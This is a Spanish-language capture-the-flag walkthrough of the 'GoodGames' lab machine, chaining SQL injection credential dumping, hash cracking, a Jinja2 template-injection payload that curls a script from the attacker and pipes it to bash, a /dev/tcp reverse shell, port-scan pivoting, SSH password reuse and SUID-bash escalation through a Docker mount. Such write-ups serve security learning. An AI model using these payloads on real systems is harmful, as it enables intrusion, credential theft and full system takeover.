---
title: "GoodGames"
description: "GoodGames"
pubDate: 2025-05-20
---

https://www.youtube.com/watch?v=r3WMeRtwmFc&t=6499s
\#docker

# Fase de reconocimiento

Puerto:
80

## Fuzzing

````
nmap --script http-enum -p80 <ip>
````

# Fase de ataque

## SQLI

El Login es vulnerable a SQLI

````
' or 1=1-- -
````

![](https://uuqke3c479llohf3.public.blob.vercel-storage.com/Pasted%20image%2020240520194757.png)
Buscamos la cantidad de columnas, hasta encontrar las exactas

````
' order by 4-- -
````

Seleccionamos todas las columnas y le ponemos un nombre para encontrarlas

````
' union select 1,2,3,4-- -
````

Ver la base de datos en uso

````
' union select 1,2,3,database()-- -
````

Ver todas las bases de datos

````
' union select 1,2,3,group_concat(schema_name) from information_schema.schemata-- -
````

Ver tablas

````
' union select 1,2,3,table_name from information_schema.tables-- -
````

Ver columnas

````
' union select 1,2,3,column_name from information_schema.columns where table_schema='<BBDD>' and table_name='<tabla>'-- -
````

Ver contenido de las columnas

````
' union select 1,2,3,group_concat(user,':',pass) from '<tabla>'-- -
````

Hay contraseña hasheada y usuario

Identificar Hash

````
hash-identifier
````

Crackear hash

````
john --wordlist=/usr/share/wordlists/rockyou.txt hash --format=Raw-MD5
````

## SSTI Server Side Template Injection

Hay un sitio en la web donde puedes cambiar tu nombre
Si es vulnerable a SSTI al poner

````
{{7*7}}
````

y sale 49 es vulnerable
![](https://uuqke3c479llohf3.public.blob.vercel-storage.com/Pasted%20image%2020240520200349.png)
![](https://uuqke3c479llohf3.public.blob.vercel-storage.com/Pasted%20image%2020240520200514.png)
Buscamos un Payload one line para inyectar y conseguir acceso a la maquina
https://github.com/swisskyrepo/PayloadsAllTheThings

### RCE

1. Creamos el reverse shell

````
#!/bin/bash

bash -i >& /dev/tcp/<ipa>/443 0>&1
````

2. Nos ponemos en escucha

````
nc -nlvp 443
````

Ponemso la shell en puerto 80

````
python3 -m http.server 80
````

3. Lanzamos el RCE en la web

````
{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('curl http://<ipa>/shell.html | bash').read() }}
````

![](https://uuqke3c479llohf3.public.blob.vercel-storage.com/Pasted%20image%2020240520201506.png)
\[-\] ==pwned!==

## Ajustar terminal

````
script /dev/null -c bash
````

ctrl + z

````
stty raw -echo; fg
````

````
	reset xterm
````

````
export TERM=xterm
````

````
stty rows 44 columns 184
````

Parece que estamos dentro de un Docker

# Privilege Escalation

## Docker

Ya somos root

## Pivoting

Buscamos puertos abiertos con un script en bash

````bash
#!/bin/bash
function ctrl_c(){
		echo -e "\n\n[!] Saliendo\n"
		tput cnorm; exit 1
}
trap ctrl_c INT

tput civis
for port in $(seq 1 65535); do
		timeout 1 bash -x "echo '' > /dev/tcp/172.19.0.1/$port" 2>/dev/null && echo "[+] Puerto abierto" &
done; wait
tput cnorm
````

Movemos el script en bash a el docker victima

1. Comprimios en base64

````
base64 -w 0 scanner.sh
````

2. Lo copiamos

````
echo <cadenabase64> | base64 -d > scanner.sh
````

Ejecutamos en busca de puertos abiertos
Nos intentamos conectar con SSH a la maquina victima reutilizando contraseña de la BBDD

\[-\] ==pwned!==

## Privilege Escalation with Docker mount

Como el directorio /home/user esta montado en el docker donde somos root y tenemos permiso de escritura en la montura.

1. Copiamos el /bin/bash en este directorio host

````
cp /bin/bash /home/user
````

2. Nos volvemos al docker
2. Cambiamos los permisos

````
chown root:root bash
````

4. Asignamos un privilegio SUID

````
chmod 4755 bash
````

5. Volvemos a la maquina host
5. Ejecutamos la bash (Los permisos SUID se habrán cambiado)

````
./bash -p
````

\[+\] ==pwned!==
